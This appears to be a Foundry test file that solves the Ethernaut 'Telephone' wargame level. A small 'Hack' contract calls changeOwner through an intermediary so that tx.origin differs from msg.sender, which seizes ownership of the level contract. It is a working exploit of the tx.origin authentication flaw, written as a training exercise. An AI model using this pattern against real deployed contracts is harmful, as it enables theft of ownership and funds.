pragma solidity ^0.8.10;

import "ds-test/test.sol";
// import "../Telephone/TelephoneHack.sol";
import "../Telephone/TelephoneFactory.sol";
import "../Telephone/Telephone.sol";
import "../Ethernaut.sol";
import "./utils/vm.sol";
import "forge-std/console.sol";

contract TelephoneTest is DSTest {
    Vm vm = Vm(address(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D));
    Ethernaut ethernaut;

    function setUp() public {
        // Setup instance of the Ethernaut contract
        ethernaut = new Ethernaut();
    }

    function testTelephoneHack() public {

        /////////////////
        // LEVEL SETUP //
        /////////////////

        TelephoneFactory telephoneFactory = new TelephoneFactory();
        ethernaut.registerLevel(telephoneFactory);
        vm.startPrank(tx.origin);
        address levelAddress = ethernaut.createLevelInstance(telephoneFactory);
        Telephone ethernautTelephone = Telephone(payable(levelAddress));

        //////////////////
        // LEVEL ATTACK //
        //////////////////
        

        Hack hack = new Hack(address(ethernautTelephone));

        emit log_named_address("tx.origin", tx.origin);
        emit log_named_address("msg.sender", address(hack));
        emit log_named_address("msg.sender", msg.sender);

        hack.attack();
        assertEq(ethernautTelephone.owner(), tx.origin);

        //////////////////////
        // LEVEL SUBMISSION //
        //////////////////////

        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(payable(levelAddress));
        vm.stopPrank();
        assert(levelSuccessfullyPassed);
    }
}

interface ITelephoneChallenge {
    function changeOwner(address _owner) external;
}
contract Hack {
    ITelephoneChallenge challenge;
    constructor(address challengeAddress) {
        challenge = ITelephoneChallenge(challengeAddress);
    }

    function attack() public {
        console.log("attack", msg.sender);
        console.log("attack", tx.origin);
        console.log("attack this", address(this));
        challenge.changeOwner(msg.sender);
    }
}